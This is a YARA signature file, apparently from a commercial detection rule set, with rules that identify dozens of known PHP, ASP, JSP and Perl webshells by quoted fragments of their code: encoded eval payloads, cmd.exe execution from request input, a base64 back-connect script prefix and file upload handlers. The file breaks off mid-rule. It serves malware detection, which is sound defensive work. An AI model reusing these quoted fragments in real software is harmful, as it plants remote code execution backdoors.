rule PHP_Cloaked_Webshell_SuperFetchExec_RID347D : ANOMALY DEMO T1036 T1505_003 WEBSHELL {
   meta:
      description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
      author = "Florian Roth"
      reference = "http://goo.gl/xFvioC"
      date = "2014-04-05 15:32:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "ANOMALY, DEMO, T1036, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);" 
   condition: 
      $s0
}

rule WebShell_RemExp_asp_php_RID3021 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 12:26:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
      $s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
      $s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
      $s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
      $s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
   condition: 
      all of them
}

rule WebShell_dC3_Security_Crew_Shell_PRiV_RID351E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 15:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
      $s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
      $s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
      $s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
      $s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
      $s20 = "if (isset($_GET['rename_all'])) {" fullword
   condition: 
      3 of them
}

rule DarkSecurityTeam_Webshell_RID3107 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Dark Security Team Webshell"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-02 13:05:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
   condition: 
      1 of them
}

rule Webshell_perlbot_pl_RID2ED9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file perlbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")" 
      $s1 = "#Acesso a Shel - 1 ON 0 OFF" 
   condition: 
      1 of them
}

rule Webshell_php_backdoor_php_RID3139 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file php-backdoor.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://michaeldaw.org   2006" 
      $s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win" 
      $s3 = "coded by z0mbie" 
   condition: 
      1 of them
}

rule Webshell_shellbot_pl_RID2F3E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shellbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ShellBOT" 
      $s1 = "PacktsGr0up" 
      $s2 = "CoRpOrAtIoN" 
      $s3 = "# Servidor de irc que vai ser usado " 
      $s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)" 
   condition: 
      2 of them
}

rule Webshell_jsp_reverse_jsp_2_RID318B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jsp-reverse.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// backdoor.jsp" 
      $s1 = "JSP Backdoor Reverse Shell" 
      $s2 = "http://michaeldaw.org" 
   condition: 
      2 of them
}

rule Webshell_Tool_asp_RID2DE7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Tool.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "mailto:rhfactor@antisocial.com" 
      $s2 = "?raiz=root" 
      $s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE" 
      $s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0" 
   condition: 
      2 of them
}

rule Webshell_NT_Addy_asp_RID2ECC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file NT Addy.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "NTDaddy v1.9 by obzerve of fux0r inc" 
      $s2 = "<ERROR: THIS IS NOT A TEXT FILE>" 
      $s4 = "RAW D.O.S. COMMAND INTERFACE" 
   condition: 
      1 of them
}

rule Webshell_phvayvv_php_php_RID3108 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phvayvv.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "{mkdir(\"$dizin/$duzenx2\",777)" 
      $s1 = "$baglan=fopen($duzkaydet,'w');" 
      $s2 = "PHVayv 1.0" 
   condition: 
      1 of them
}

rule Webshell_rst_sql_php_php_RID30FC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rst_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\tmp\\dump_" 
      $s1 = "RST MySQL" 
      $s2 = "http://rst.void.ru" 
      $s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';" 
   condition: 
      2 of them
}

rule Webshell_c99madshell_v2_0_php_php_RID33A9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file c99madshell_v2.0.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef" 
   condition: 
      all of them
}

rule Webshell_telnet_pl_RID2E6D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "W A R N I N G: Private Server" 
      $s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   " 
   condition: 
      all of them
}

rule Webshell_w3d_php_php_RID2F02 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file w3d.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "W3D Shell" 
      $s1 = "By: Warpboy" 
      $s2 = "No Query Executed" 
   condition: 
      2 of them
}

rule Webshell_WebShell_cgi_RID2F4E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file WebShell.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WebShell.cgi" 
      $s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else" 
   condition: 
      all of them
}

rule Webshell_WinX_Shell_html_RID3097 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file WinX Shell.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WinX Shell" 
      $s1 = "Created by greenwood from n57" 
      $s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>" 
   condition: 
      2 of them
}

rule Webshell_csh_php_php_RID2F32 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file csh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ".::[c0derz]::. web-shell" 
      $s1 = "http://c0derz.org.ua" 
      $s2 = "vint21h@c0derz.org.ua" 
      $s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root" 
   condition: 
      1 of them
}

rule Webshell_pHpINJ_php_php_RID2FFD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pHpINJ.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "News Remote PHP Shell Injection" 
      $s3 = "Php Shell <br />" fullword
      $s4 = "<input type = \"text\" name = \"url\" value = \"" 
   condition: 
      2 of them
}

rule Webshell_sig_2008_php_php_RID3060 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file 2008.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:37:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Codz by angel(4ngel)" 
      $s1 = "Web: http://www.4ngel.net" 
      $s2 = "$admin['cookielife'] = 86400;" 
      $s3 = "$errmsg = 'The file you want Downloadable was nonexistent';" 
   condition: 
      1 of them
}

rule Webshell_ak74shell_php_php_RID3143 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ak74shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION[" 
      $s2 = "AK-74 Security Team Web Site: www.ak74-team.net" 
      $s3 = "$xshell" 
   condition: 
      2 of them
}

rule Webshell_zacosmall_php_RID3013 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file zacosmall.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:24:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "rand(1,99999);$sj98" 
      $s1 = "$dump_file.='`'.$rows2[0].'`" 
      $s3 = "filename=\\\"dump_{$db_dump}_${table_d" 
   condition: 
      2 of them
}

rule Webshell_CmdAsp_asp_RID2E81 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file CmdAsp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:17:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "CmdAsp.asp" 
      $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
      $s2 = "-- Use a poor man's pipe ... a temp file --" 
      $s3 = "maceo @ dogmile.com" 
   condition: 
      2 of them
}

rule Webshell_mysql_shell_php_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "smkim@popeye.snu.ac.kr" 
      $s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen" 
   condition: 
      1 of them
}

rule Webshell_Reader_asp_RID2E9C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Reader.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mehdi & HolyDemon" 
      $s2 = "www.infilak." 
      $s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%" 
   condition: 
      2 of them
}

rule Webshell_jspshall_jsp_RID2FB3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jspshall.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kj021320" 
      $s1 = "case 'T':systemTools(out);break;" 
      $s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file" 
   condition: 
      2 of them
}

rule Webshell_Webshell_php_Blocker_RID32A4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file webshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<die(\"Couldn't Read directory, Blocked!!!\");" 
      $s3 = "PHP Web Shell" 
   condition: 
      all of them
}

rule Webshell_shells_PHP_wso_RID3030 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file wso.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi" 
      $s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos" 
   condition: 
      1 of them
}

rule Webshell_indexer_asp_RID2F38 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file indexer.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:47:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ" 
      $s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit" 
   condition: 
      1 of them
}

rule Webshell_DxShell_php_php_RID30A8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DxShell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:49:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
}

rule Webshell_kacak_asp_RID2E44 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file kacak.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Kacak FSO 1.0" 
      $s1 = "if request.querystring(\"TGH\") = \"1\" then" 
      $s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style=" 
      $s4 = "mailto:BuqX@hotmail.com" 
   condition: 
      1 of them
}

rule Webshell_PHP_Backdoor_Connect_pl_php_RID351D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LorD of IRAN HACKERS SABOTAGE" 
      $s1 = "LorD-C0d3r-NT" 
      $s2 = "echo --==Userinfo==-- ;" 
   condition: 
      1 of them
}

rule Webshell_Antichat_Shell_v1_3_php_RID3368 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Shell v1.3.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:46:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Antichat" 
      $s1 = "Can't open file, permission denide" 
      $s2 = "$ra44" 
   condition: 
      2 of them
}

rule Webshell_cmd_asp_5_1_asp_RID3044 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cmd-asp-5.1.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:32:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
      $s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
   condition: 
      1 of them
}

rule Webshell_EFSO_2_asp_RID2E07 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file EFSO_2.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Ejder was HERE" 
      $s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~" 
   condition: 
      2 of them
}

rule Webshell_lamashell_php_RID3000 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lamashell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lama's'hell" fullword
      $s1 = "if($_POST['king'] == \"\") {" 
      $s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f" 
   condition: 
      1 of them
}

rule Webshell_Sincap_php_php_RID3052 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Sincap.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');" 
      $s2 = "$tampon4=$tampon3-1" 
      $s3 = "@aventgrup.net" 
   condition: 
      2 of them
}

rule Webshell_Test_php_php_RID2F94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Test.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
      $s2 = "fwrite ($fp, \"$yazi\");" fullword
      $s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
   condition: 
      1 of them
}

rule Webshell_Zehir_4_asp_RID2EDE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Zehir 4.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=" 
      $s4 = "<input type=submit value=\"Test Et!\" onclick=\"" 
   condition: 
      1 of them
}

rule Webshell_phpjackal_php_RID2FFB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpjackal.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$dl=$_REQUEST['downloaD'];" 
      $s4 = "else shelL(\"perl.exe $name $port\");" 
   condition: 
      1 of them
}

rule Webshell_sql_php_php_RID2F44 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#" 
      $s2 = "http://rst.void.ru" 
      $s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      1 of them
}

rule Webshell_telnetd_pl_RID2ED1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnetd.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "0ldW0lf" fullword
      $s1 = "However you are lucky :P" 
      $s2 = "I'm FuCKeD" 
      $s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#" 
      $s4 = "atrix@irc.brasnet.org" 
   condition: 
      1 of them
}

rule Webshell_telnet_cgi_RID2EC4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "W A R N I N G: Private Server" 
      $s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie" 
      $s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C" 
   condition: 
      1 of them
}

rule Webshell_ironshell_php_RID301D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ironshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "www.ironwarez.info" 
      $s1 = "$cookiename = \"wieeeee\";" 
      $s2 = "~ Shell I" 
      $s3 = "www.rootshell-team.info" 
      $s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);" 
   condition: 
      1 of them
}

rule Webshell_backdoorfr_php_RID306A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backdoorfr.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan" 
      $s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc" 
   condition: 
      1 of them
}

rule Webshell_aspydrv_asp_RID2F52 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aspydrv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:52:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
